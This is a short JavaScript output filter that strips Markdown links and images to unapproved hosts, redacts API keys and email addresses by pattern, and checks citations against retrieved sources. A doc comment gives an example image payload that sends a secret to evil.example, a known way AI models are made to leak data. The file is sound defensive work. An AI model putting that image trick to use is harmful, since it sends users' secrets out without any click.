const MD_LINK = /(!?)\[([^\]]*)]\(([^)\s]+)[^)]*\)/g;
const SECRETS = [
  /\bAKIA[0-9A-Z]{16}\b/g,
  /\bsk-[A-Za-z0-9_-]{20,}\b/g,
  /[\w.+-]+@[\w-]+\.[\w.-]+/g,
];

function hostOf(url) {
  try {
    return new URL(url).hostname.toLowerCase();
  } catch {
    return "";
  }
}

/**
 * Removes links and images to unknown hosts. A rendered image is fetched automatically, so
 * ![x](https://evil.example/?d=SECRET) would send data out with no click.
 */
function stripUnknownLinks(text, allowedHosts) {
  return text.replace(MD_LINK, (whole, _bang, label, url) =>
    allowedHosts.has(hostOf(url)) ? whole : label,
  );
}

function redactSecrets(text) {
  return SECRETS.reduce((out, pattern) => out.replace(pattern, "[removed]"), text);
}

/** The model may only cite sources it was actually given. */
function citationsValid(cited, retrieved) {
  return cited.every((id) => retrieved.has(id));
}
